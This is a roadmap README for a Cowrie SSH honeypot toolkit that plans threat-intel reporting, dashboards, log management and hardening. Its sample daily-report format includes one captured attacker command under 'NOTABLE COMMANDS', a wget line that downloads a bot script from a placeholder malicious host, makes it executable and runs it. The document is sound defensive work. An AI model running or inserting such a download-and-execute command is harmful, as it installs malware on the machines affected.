# Roadmap

Future enhancements for the Cowrie honeypot deployment toolkit.

## Phase 1: Daily Email Reports with Threat Intelligence ✅ COMPLETED

The first milestone combines daily reporting with essential threat intelligence enrichment.

**Implementation:** `scripts/daily-report.py` - Full-featured reporting system with threat intelligence

### Core Reporting (`scripts/daily-report.py`)
- [x] Parse Cowrie JSON logs for the past 24 hours
- [x] Generate summary statistics:
  - Total connection attempts
  - Unique source IPs
  - Top usernames/passwords attempted
  - Commands executed by attackers
  - Session duration statistics
  - Files downloaded (with SHA256 hashes)

### GeoIP Enrichment
- [x] MaxMind GeoLite2 database integration
  - Country, city, coordinates for each source IP
  - ASN and organization lookup
- [x] Attack origin map (ASCII or HTML with embedded map image)
- [x] Top attacking countries summary

### VirusTotal Integration
- [x] Submit downloaded file hashes to VirusTotal API
- [x] Include detection ratio in report (e.g., "45/70 engines")
- [x] Link to full VT report for each file
- [x] Cache results to avoid API rate limits (SQLite cache)
- [x] Configuration: `VT_API_KEY` environment variable

### YARA Scanning
- [x] Local YARA rule scanning for downloaded files
- [x] Include curated rule sets:
  - Malware family detection
  - Packer/crypter identification
  - Cryptocurrency miners
  - Webshells and backdoors
- [x] Custom rules directory: `/opt/cowrie/yara-rules/`
- [x] Report matched rules per file

### Email Delivery
- [x] `msmtp` or `sendmail` for direct SMTP
- [x] Integration with SendGrid/Mailgun API for reliability
- [x] HTML email with inline styling (no external dependencies)
- [ ] Optional PGP encryption for sensitive reports (future enhancement)
- [x] Cron job: `0 6 * * * /opt/cowrie/scripts/daily-report.py`

### Report Format
```
Subject: [Honeypot] Daily Report - 2024-12-06 - 847 attacks from 124 IPs

SUMMARY
-------
Connections: 847
Unique IPs: 124
Top country: China (45%), Russia (23%), USA (12%)
Sessions with commands: 34
Files downloaded: 3

TOP CREDENTIALS
---------------
root:123456 (156 attempts)
admin:admin (89 attempts)
...

DOWNLOADED FILES
----------------
SHA256: abc123...
  Size: 45KB
  YARA: Mirai_Botnet, UPX_Packed
  VirusTotal: 52/70 detections
  VT Link: https://virustotal.com/...

GEO DISTRIBUTION
----------------
[ASCII map or link to HTML version]

NOTABLE COMMANDS
----------------
wget http://malicious.com/bot.sh && chmod +x bot.sh && ./bot.sh
...
```

### Real-time Alerts
- [x] Webhook notifications (Slack, Discord, Teams)
- [x] Threshold-based alerting (e.g., >100 attempts/hour)
- [x] Alert on specific events:
  - Malware downloads
- [ ] Future enhancements:
  - Successful logins
  - Known attacker IPs (threat intel integration)

## Phase 2: Dashboard & Visualization

### Option 1: ELK Stack (Elasticsearch + Logstash + Kibana)
- Heavy but powerful, good for large-scale deployments
- Native Cowrie support via Logstash output plugin
- Pre-built Kibana dashboards available
- Resource requirements: 4GB+ RAM

### Option 2: Grafana + Loki (Recommended)
- Lightweight alternative to ELK
- Loki for log aggregation (label-based, efficient)
- Grafana for visualization
- Docker Compose deployment
- Resource requirements: 1-2GB RAM

### Option 3: Custom Dashboard
- [ ] Simple Flask/FastAPI web app
- [ ] Read from JSON logs directly
- [ ] Display:
  - Live connection map (IP geolocation)
  - Recent sessions with replay capability
  - Attack timeline graph
  - Credential wordcloud
  - Downloaded file analysis (reuse Phase 1 VT/YARA integration)

## Phase 3: Log Management & Extended Threat Intel

### Centralized Logging
- [ ] Ship logs to central syslog server
- [ ] S3/MinIO backup for long-term storage
- [ ] Log rotation configuration
- [ ] Retention policies (e.g., 90 days on-disk, 1 year archived)

### Extended Threat Intelligence
- [ ] Additional threat intel sources:
  - AbuseIPDB reputation lookup
  - Shodan host information
  - GreyNoise classification (benign scanner vs malicious)
  - AlienVault OTX pulse correlation

## Future: Honeypot Enhancements

### Additional Realism
- [ ] Custom txtcmds for more commands (df, free, top, etc.)
- [ ] Fake MySQL/PostgreSQL databases with sample data
- [ ] Realistic cron jobs in process list
- [ ] Fake user home directories with files
- [ ] Web honeypot on port 80/443 (nginx with fake admin panels)

### Telnet Support
- [ ] Enable Cowrie telnet listener
- [ ] Configure on port 23
- [ ] Realistic telnet banner

### Multiple Honeypot Deployment
- [ ] Deploy fleet across multiple Hetzner locations
- [ ] Centralized log collection
- [ ] Configuration management (Ansible playbooks)

## Future: Threat Intelligence Sharing

### IoC Extraction
- [ ] Automatic IoC extraction from sessions:
  - URLs from wget/curl commands
  - IP addresses and domains
  - File hashes (MD5, SHA1, SHA256)

### Sharing
- [ ] Export to STIX/TAXII format
- [ ] Integration with MISP
- [ ] Contribute to community threat feeds

## Future: Infrastructure

### Terraform/Pulumi
- [ ] Infrastructure as Code for Hetzner deployment
- [ ] Multi-region deployment
- [ ] Auto-scaling based on attack volume

### Kubernetes
- [ ] Helm chart for Cowrie deployment
- [ ] Horizontal pod autoscaling
- [ ] Centralized logging with Fluentd

## Future: Security Hardening

### Network Segmentation
- [ ] Firewall rules to prevent honeypot from attacking outbound
- [ ] Rate limiting on management port
- [ ] Fail2ban for management SSH

### Monitoring
- [ ] Health checks for Cowrie container
- [ ] Disk space monitoring
- [ ] Automatic restart on failure
- [ ] Uptime monitoring (e.g., UptimeRobot, Healthchecks.io)

---

## Implementation Priority

| Phase | Description | Dependencies |
|-------|-------------|--------------|
| **Phase 1** | Daily Email Reports + GeoIP + VirusTotal + YARA | MaxMind account, VT API key |
| **Phase 2** | Dashboard (Grafana + Loki recommended) | Phase 1 complete |
| **Phase 3** | Log management + Extended threat intel | Phase 2 complete |
| Future | Honeypot enhancements, multi-site, IaC | As needed |

### Phase 1 Requirements
- **MaxMind GeoLite2**: Free account at https://www.maxmind.com/en/geolite2/signup
- **VirusTotal API**: Free tier (4 requests/minute) at https://www.virustotal.com/
- **YARA**: Install via `apt install yara` or use Python `yara-python` package
- **YARA Rules**:
  - https://github.com/Yara-Rules/rules (community rules)
  - https://github.com/Neo23x0/signature-base (Florian Roth's rules)
